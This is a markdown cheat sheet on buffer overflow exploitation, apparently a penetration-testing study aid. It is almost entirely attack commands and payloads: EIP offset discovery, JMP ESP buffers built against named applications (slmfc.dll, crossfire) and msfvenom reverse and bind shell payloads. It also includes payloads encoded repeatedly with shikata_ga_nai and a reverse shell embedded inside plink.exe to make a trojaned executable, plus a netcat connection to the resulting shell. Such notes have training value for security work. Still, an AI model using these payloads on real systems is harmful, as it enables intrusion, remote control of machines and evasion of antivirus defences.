# Buffer overflow (BOF)


## (NEW)

## Buffer Overflow

1. Determine length of overflow trigger w/ binary search "A"x1000
2. Determine exact EIP with `pattern_create.rb` & `pattern_offset.rb`
3. Determine badchars to make sure all of your payload is getting through
4. Develop exploit
  - Is the payload right at ESP
    - `JMP ESP`
  - Is the payload before ESP
    - `sub ESP, 200` and then `JMP ESP`
    - or
    - `call [ESP-200]`
5. `msfvenom -a x86 --platform windows/linux -p something/shell/reverse_tcp lhost=x.x.x.x lport=53 -f exe/elf/python/perl/php -o filename`
  - Make sure it fits your payload length above
6. Gain shell, local priv esc or rooted already?


## (OLD)
##Methodology

1. Investigate the file
```
file
strings
```

2. Test it out - what does the program do?

3. Look at its functions in GDB

```
info functions
```

4. Look at the assembly of a function

```
disass main
disass otherfunction
```

5. Look for the flow of the program. Look for cmp

6. Set up breakpoints with hooks

```
define hook-stop
info registers  ;show the registers
x/24xw $esp  ;show the stack
x/2i $eip  ;show the new two instructions
end
```

7. Step through the whole program. Or at the breakpoints

```
si ;steps one forward, but follows functions
ni ;does not follow functions
```

## (NEW)
### Windows Buffer Overflows

-   Controlling EIP

```
locate pattern_create
pattern_create.rb -l 2700
locate pattern_offset
pattern_offset.rb -q 39694438
```

-   Verify exact location of EIP - [\*] Exact match at offset 2606
```
buffer = "A" \* 2606 + "B" \* 4 + "C" \* 90
```

-   Check for “Bad Characters” -
```
Run multiple times 0x00 - 0xFF
```
-   Use Mona to determine a module that is unprotected

-   Bypass DEP if present by finding a Memory Location with Read and Execute access for JMP ESP

-   Use NASM to determine the HEX code for a JMP ESP instruction

```
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

JMP ESP  
00000000 FFE4 jmp esp
```

-   Run Mona in immunity log window to find (FFE4) XEF command

    ```
!mona find -s "\xff\xe4" -m slmfc.dll  
found at 0x5f4a358f - Flip around for little endian format
buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * 390
```

-   MSFVenom to create payload
```
msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
```
-   Final Payload with NOP slide  
```
'buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode
```
-   Create a PE Reverse Shell  
```
msfvenom -p windows/shell\_reverse\_tcp LHOST=$ip LPORT=4444
-f  
exe -o shell\_reverse.exe
```


-   Create a PE Reverse Shell and Encode 9 times with
Shikata\_ga\_nai
 ```
msfvenom -p windows/shell\_reverse\_tcp LHOST=$ip LPORT=4444
-f  exe -e x86/shikata\_ga\_nai -i 9 -o shell\_reverse\_msf\_encoded.exe
```


-   Create a PE reverse shell and embed it into an existing
executable  
```
msfvenom -p windows/shell\_reverse\_tcp LHOST=$ip LPORT=4444 -f  exe -e x86/shikata\_ga\_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o   shell\_reverse\_msf\_encoded\_embedded.exe
        ```


-   Create a PE Reverse HTTPS shell  
    ```
msfvenom -p windows/meterpreter/reverse\_https LHOST=$ip
        LPORT=443 -f exe -o met\_https\_reverse.exe
        ```

###   Linux Buffer Overflows

-   Run Evans Debugger against an app  
    ```
        edb --run /usr/games/crossfire/bin/crossfire
        ```

-   ESP register points toward the end of our CBuffer  
    ```
        add eax,12  
        jmp eax  
        83C00C add eax,byte +0xc  
        FFE0 jmp eax
        ```

-   Check for “Bad Characters” Process of elimination -
```
Run multiple times 0x00 - 0xFF
```
-   Find JMP ESP address  
    ```
        "\\x97\\x45\\x13\\x08" \# Found at Address 08134597
```
-   crash = "\\x41" \* 4368 + "\\x97\\x45\\x13\\x08" +"\\x83\\xc0\\x0c\\xff\\xe0\\x90\\x90"


-   msfvenom -p linux/x86/shell\_bind\_tcp LPORT=4444 -f c -b "\\x00\\x0a\\x0d\\x20" –e x86/shikata\_ga\_nai

-   Connect to the shell with netcat:  
    ```
nc -v $ip 4444
```
